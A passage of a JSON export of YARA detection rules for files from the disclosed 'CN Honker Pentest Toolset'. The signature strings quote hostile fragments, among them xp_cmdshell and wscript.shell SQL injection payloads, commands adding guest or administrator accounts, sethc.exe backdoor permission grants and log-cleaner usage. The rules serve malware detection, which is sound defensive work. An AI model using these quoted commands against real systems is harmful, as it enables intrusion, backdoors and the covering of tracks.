Toolset","required_modules":[],"rule_hash":"fbab62529574271c1f0fd39f5234aa4f","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_exp_win2003_RID2E86 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file win2003.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:18:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage:system_exp.exe \\\"cmd\\\"\" fullword ascii\n      $s2 = \"The shell \\\"cmd\\\" success!\" fullword ascii\n      $s4 = \"Not Windows NT family OS.\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}","date":"2015-06-23 11:18:11","description":"Sample from CN Honker Pentest Toolset - file win2003.exe","minimum_yara":"1.7","name":"CN_Honker_exp_win2003_RID2E86","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"57877205700e1f0aec0f7f4fbe7a973f","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Interception3389_setup_RID3322 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file setup.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:34:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Notify\\\\%s\" fullword ascii\n      $s1 = \"%s\\\\temp\\\\temp%d.bat\" fullword ascii\n      $s5 = \"EventStartShell\" fullword ascii\n      $s6 = \"del /f /q \\\"%s\\\"\" fullword ascii\n      $s7 = \"\\\\wminotify.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}","date":"2015-06-23 14:34:51","description":"Sample from CN Honker Pentest Toolset - file setup.exe","minimum_yara":"1.7","name":"CN_Honker_Interception3389_setup_RID3322","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"529115e3b9d6323686e16990c5b336d7","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_CnCerT_CCdoor_CMD_2_RID3143 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file CnCerT.CCdoor.CMD.dll2\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:15:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"cmd.dll\" fullword wide\n      $s1 = \"cmdpath\" fullword ascii\n      $s2 = \"Get4Bytes\" fullword ascii\n      $s3 = \"ExcuteCmd\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 22KB and all of them\n}","date":"2015-06-23 13:15:01","description":"Sample from CN Honker Pentest Toolset - file CnCerT.CCdoor.CMD.dll2","minimum_yara":"1.7","name":"CN_Honker_CnCerT_CCdoor_CMD_2_RID3143","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"534fe9c30f350b66295abcb0847d14a5","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_exp_ms11046_RID2E4F : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ms11046.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:09:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"[*] Token system command\" fullword ascii\n      $s1 = \"[*] command add user 90sec 90sec\" fullword ascii\n      $s2 = \"[*] Add to Administrators success\" fullword ascii\n      $s3 = \"Program: %s%s%s%s%s%s%s%s%s%s%s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}","date":"2015-06-23 11:09:01","description":"Sample from CN Honker Pentest Toolset - file ms11046.exe","minimum_yara":"1.7","name":"CN_Honker_exp_ms11046_RID2E4F","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"efbf8ef2183257bdfbd6671cd2f1a2e2","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Master_beta_1_7_RID3054 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Master_beta_1.7.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:35:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://seo.chinaz.com/?host=\" fullword ascii\n      $s2 = \"Location: getpass.asp?info=\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 312KB and all of them\n}","date":"2015-06-23 12:35:11","description":"Sample from CN Honker Pentest Toolset - file Master_beta_1.7.exe","minimum_yara":"1.7","name":"CN_Honker_Master_beta_1_7_RID3054","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"c19c927e5213ec1b44ee482b4497592f","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_F4ck_Team_f4ck_2_RID304D : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file f4ck_2.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:34:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"F4ck.exe\" fullword wide\n      $s2 = \"@Netapi32.dll\" fullword ascii\n      $s3 = \"Team.F4ck.Net\" fullword wide\n      $s8 = \"Administrators\" fullword ascii\n      $s9 = \"F4ck Team\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 220KB and 2 of them\n}","date":"2015-06-23 12:34:01","description":"Sample from CN Honker Pentest Toolset - file f4ck_2.exe","minimum_yara":"1.7","name":"CN_Honker_F4ck_Team_f4ck_2_RID304D","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"7341c701a805864a08ac846304a7a2e0","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_sig_3389_80_AntiFW_RID308F : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file AntiFW.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:45:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Set TS to port:80 Successfully!\" fullword ascii\n      $s2 = \"Now,set TS to port 80\" fullword ascii\n      $s3 = \"echo. >>amethyst.reg\" fullword ascii\n      $s4 = \"del amethyst.reg\" fullword ascii\n      $s5 = \"AntiFW.cpp\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 2 of them\n}","date":"2015-06-23 12:45:01","description":"Sample from CN Honker Pentest Toolset - file AntiFW.exe","minimum_yara":"1.7","name":"CN_Honker_sig_3389_80_AntiFW_RID308F","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"5ad4bf63586cec24fe3fcf6e6b15efc4","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_wwwscan_gui_RID2F75 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file wwwscan_gui.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:58:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s www.target.com -p 8080 -m 10 -t 16\" fullword ascii\n      $s2 = \"/eye2007Admin_login.aspx\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 280KB and all of them\n}","date":"2015-06-23 11:58:01","description":"Sample from CN Honker Pentest Toolset - file wwwscan_gui.exe","minimum_yara":"1.7","name":"CN_Honker_wwwscan_gui_RID2F75","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"baed62509ab3e7b641e83d5a62f0aaaa","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_SwordCollEdition_RID312C : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file SwordCollEdition.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:11:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"YuJianScan.exe\" fullword wide\n      $s1 = \"YuJianScan\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 225KB and all of them\n}","date":"2015-06-23 13:11:11","description":"Sample from CN Honker Pentest Toolset - file SwordCollEdition.exe","minimum_yara":"1.7","name":"CN_Honker_SwordCollEdition_RID312C","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"d18590d24fab2fd82061b94fad22c200","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_HconSTFportable_RID3095 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file HconSTFportable.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:46:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"HconSTFportable.exe\" fullword wide\n      $s2 = \"www.Hcon.in\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 354KB and all of them\n}","date":"2015-06-23 12:46:01","description":"Sample from CN Honker Pentest Toolset - file HconSTFportable.exe","minimum_yara":"1.7","name":"CN_Honker_HconSTFportable_RID3095","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"2d0a051ac4095cd33efbc232b1984585","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_T00ls_Lpk_Sethc_v3_LPK_RID3284 : DEMO EXE FILE HKTL T1015 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file LPK.DAT\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:08:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1015\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"FreeHostKillexe.exe\" fullword ascii\n      $s2 = \"\\\\sethc.exe /G everyone:F\" fullword ascii\n      $s3 = \"c:\\\\1.exe\" fullword ascii\n      $s4 = \"Set user Group Error! Username:\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}","date":"2015-06-23 14:08:31","description":"Sample from CN Honker Pentest Toolset - file LPK.DAT","minimum_yara":"1.7","name":"CN_Honker_T00ls_Lpk_Sethc_v3_LPK_RID3284","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"81efebbb34ef4b68c8429a32a128b836","score":70,"tags":["DEMO","EXE","T1015","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Without_a_trace_Wywz_RID3309 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Wywz.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:30:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Symantec\\\\Norton Personal Firewall\\\\Log\\\\Content.log\" fullword ascii\n      $s2 = \"UpdateFile=d:\\\\tool\\\\config.ini,Option\\\\\\\\proxyIp=127.0.0.1\\\\r\\\\nproxyPort=808\" ascii\n      $s3 = \"%s\\\\subinacl.exe /subkeyreg \\\"%s\\\" /Grant=%s=f /Grant=everyone=f\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1800KB and all of them\n}","date":"2015-06-23 14:30:41","description":"Sample from CN Honker Pentest Toolset - file Wywz.exe","minimum_yara":"1.7","name":"CN_Honker_Without_a_trace_Wywz_RID3309","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"9c39120de4a95dabb8d666fce325e830","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_LPK2_0_LPK_RID2DB5 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file LPK.DAT\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:43:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\sethc.exe /G everyone:F\" fullword ascii\n      $s2 = \"net1 user guest guest123!@#\" fullword ascii\n      $s3 = \"\\\\dllcache\\\\sethc.exe\" fullword ascii\n      $s4 = \"sathc.exe 211\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1030KB and all of them\n}","date":"2015-06-23 10:43:21","description":"Sample from CN Honker Pentest Toolset - file LPK.DAT","minimum_yara":"1.7","name":"CN_Honker_LPK2_0_LPK_RID2DB5","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"530b0426dc70cc5d524258fe336221f9","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_cleaniis_RID2E0F : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file cleaniis.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:58:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"iisantidote <logfile dir> <ip or string to hide>\" fullword ascii\n      $s4 = \"IIS log file cleaner by Scurt\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}","date":"2015-06-23 10:58:21","description":"Sample from CN Honker Pentest Toolset - file cleaniis.exe","minimum_yara":"1.7","name":"CN_Honker_cleaniis_RID2E0F","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"7dcfca1e09be9a1352b7324a85139193","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_arp3_7_arp3_7_RID2F3E : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file arp3.7.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:48:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"CnCerT.Net.SKiller.exe\" fullword wide\n      $s2 = \"www.80sec.com\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and all of them\n}","date":"2015-06-23 11:48:51","description":"Sample from CN Honker Pentest Toolset - file arp3.7.exe","minimum_yara":"1.7","name":"CN_Honker_arp3_7_arp3_7_RID2F3E","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"8d18a2a51cf8b588d973fa350b60ad84","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_exp_ms11080_RID2E4D : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ms11080.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:08:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"[*] command add user 90sec 90sec\" fullword ascii\n      $s6 = \"[*] Add to Administrators success\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 840KB and all of them\n}","date":"2015-06-23 11:08:41","description":"Sample from CN Honker Pentest Toolset - file ms11080.exe","minimum_yara":"1.7","name":"CN_Honker_exp_ms11080_RID2E4D","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"4b16ac9bbb013f6ca72a1b82e2850b4c","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Injection_transit_RID31CE : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Injection_transit.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:38:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<description>Your app description here</description> \" fullword ascii\n      $s4 = \"Copyright (C) 2003 ZYDSoft Corp.\" fullword wide\n      $s5 = \"ScriptnackgBun\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3175KB and all of them\n}","date":"2015-06-23 13:38:11","description":"Sample from CN Honker Pentest Toolset - file Injection_transit.exe","minimum_yara":"1.7","name":"CN_Honker_Injection_transit_RID31CE","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"a3a4d3446d3c748c5e6e82d6b993d295","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Safe3WVS_RID2D79 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Safe3WVS.EXE\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:33:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"2TerminateProcess\" fullword ascii\n      $s1 = \"mscoreei.dll\" fullword ascii\n      $s7 = \"SafeVS.exe\" fullword wide\n      $s8 = \"www.safe3.com.cn\" fullword wide\n      $s20 = \"SOFTWARE\\\\Classes\\\\Interface\\\\\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them\n}","date":"2015-06-23 10:33:21","description":"Sample from CN Honker Pentest Toolset - file Safe3WVS.EXE","minimum_yara":"1.7","name":"CN_Honker_Safe3WVS_RID2D79","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"8d964640a5aa679e6260eca4b807a66e","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_NBSI_3_0_RID2D14 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file NBSI 3.0.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:16:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \";use master declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamet\" wide\n      $s2 = \"http://localhost/1.asp?id=16\" fullword ascii\n      $s3 = \" exec master.dbo.xp_cmdshell @Z--\" fullword wide\n      $s4 = \";use master declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamet\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2600KB and 2 of them\n}","date":"2015-06-23 10:16:31","description":"Sample from CN Honker Pentest Toolset - file NBSI 3.0.exe","minimum_yara":"1.7","name":"CN_Honker_NBSI_3_0_RID2D14","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"45684e0e6077bd3956b5143c63fdbe2d","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_sig_3389_DUBrute_v3_0_RC3_2_0_RID3418 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file 2.0.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:15:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"IP - %d; Login - %d; Password - %d; Combination - %d\" fullword ascii\n      $s3 = \"Create %d IP@Loginl;Password\" fullword ascii\n      $s15 = \"UBrute.com\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 980KB and 2 of them\n}","date":"2015-06-23 15:15:51","description":"Sample from CN Honker Pentest Toolset - file 2.0.exe","minimum_yara":"1.7","name":"CN_Honker_sig_3389_DUBrute_v3_0_RC3_2_0_RID3418","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"f201dd5920e62ff692b5045dee9bda1b","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_hkmjjiis6_RID2E56 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file hkmjjiis6.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:10:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s14 = \"* FROM IIsWebInfo/r\" fullword ascii\n      $s19 = \"ltithread4ck/\" fullword ascii\n      $s20 = \"LookupAcc=Sid#\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 175KB and all of them\n}","date":"2015-06-23 11:10:11","description":"Sample from CN Honker Pentest Toolset - file hkmjjiis6.exe","minimum_yara":"1.7","name":"CN_Honker_hkmjjiis6_RID2E56","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"7585795c55063bafdf19bb44177d1e74","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_clearlogs_RID2E83 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file clearlogs.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:17:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"- http://ntsecurity.nu/toolbox/clearlogs/\" fullword ascii\n      $s4 = \"Error: Unable to clear log - \" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 140KB and all of them\n}","date":"2015-06-23 11:17:41","description":"Sample from CN Honker Pentest Toolset - file clearlogs.exe","minimum_yara":"1.7","name":"CN_Honker_clearlogs_RID2E83","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"814cadd46cb70d03da4a4c2a882c52a0","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_no_net_priv_esc_AddUser_RID340B : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file AddUser.dll\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:13:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"PECompact2\" fullword ascii\n      $s1 = \"adduser\" fullword ascii\n      $s5 = \"OagaBoxA\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 115KB and all of them\n}","date":"2015-06-23 15:13:41","description":"Sample from CN Honker Pentest Toolset - file AddUser.dll","minimum_yara":"1.7","name":"CN_Honker_no_net_priv_esc_AddUser_RID340B","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"474639638926f8a42b921da56c74421b","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Injection_RID2E6A : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Injection.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:13:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"http://127.0.0.1/6kbbs/bank.asp\" fullword ascii\n      $s7 = \"jmPost.asp\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 220KB and all of them\n}","date":"2015-06-23 11:13:31","description":"Sample from CN Honker Pentest Toolset - file Injection.exe","minimum_yara":"1.7","name":"CN_Honker_Injection_RID2E6A","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"18ed84592b8951c153d4572ee113f03f","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_SQLServer_inject_Creaked_RID3418 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file SQLServer_inject_Creaked.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:15:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://localhost/index.asp?id=2\" fullword ascii\n      $s2 = \"Email:zhaoxypass@yahoo.com.cn<br>\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 8110KB and all of them\n}","date":"2015-06-23 15:15:51","description":"Sample from CN Honker Pentest Toolset - file SQLServer_inject_Creaked.exe","minimum_yara":"1.7","name":"CN_Honker_SQLServer_inject_Creaked_RID3418","reference":"Disclosed CN Honker Pentest 